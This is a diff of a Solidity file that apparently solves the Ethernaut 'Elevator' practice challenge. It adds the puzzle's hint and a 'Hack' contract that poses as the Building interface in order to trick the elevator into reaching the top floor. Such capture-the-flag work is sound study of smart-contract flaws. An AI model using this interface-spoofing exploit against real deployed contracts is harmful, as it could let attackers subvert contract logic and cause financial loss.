@@ -1,12 +1,16 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.7;
 
+
+/**
+This elevator won't let you reach the top of your building. Right?
+
+Things that might help:
+Sometimes solidity is not good at keeping promises.
+This Elevator expects to be used from a Building.
+**/
 interface Building {
   function isLastFloor(uint) external returns (bool);
-}
-
-interface ElevatorI {
-  function goTo(uint _floor) external;
 }
 
 contract Elevator {
@@ -23,9 +27,18 @@ contract Elevator {
   }
 }
 
-contract BuildingWrap is Building {
+interface ElevatorI {
+  function goTo(uint _floor) external;
+}
 
+contract Hack is Building {
+
+  ElevatorI elevator;
    uint public floor = 0;
+
+  constructor(address _add) {
+   elevator =  ElevatorI(_add);
+  }
 
    function setFLoor(uint _floor) public {
      floor = _floor;
@@ -37,8 +50,7 @@ contract BuildingWrap is Building {
     return res;
   }
 
-  function goToTop(address _add) public{
-    ElevatorI elevator = ElevatorI(_add);
+  function hack() public{
     elevator.goTo(1);
   }
 
